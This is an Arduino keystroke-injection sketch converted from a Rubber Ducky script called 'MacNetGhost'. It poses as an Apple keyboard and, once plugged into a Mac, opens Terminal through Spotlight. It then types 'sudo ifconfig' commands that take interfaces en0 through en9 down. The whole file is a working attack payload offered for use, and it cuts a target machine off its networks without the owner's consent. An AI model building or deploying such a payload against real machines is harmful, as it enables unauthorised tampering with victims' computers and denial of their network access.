// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Ducky Script for Network Obscurity and Disabling Interfaces
  // Author: Narsty
  // Title: MacNetGhost
  // Target: MacOS
  // Version: 1.0
  // Category: Obscurity
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo ifconfig en0 down");

  typeKey(KEY_RETURN);

  delay(7000);

  Keyboard.print("sudo ifconfig en1 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en2 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en3 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en4 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en5 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en6 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en7 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en8 down");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo ifconfig en9 down");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}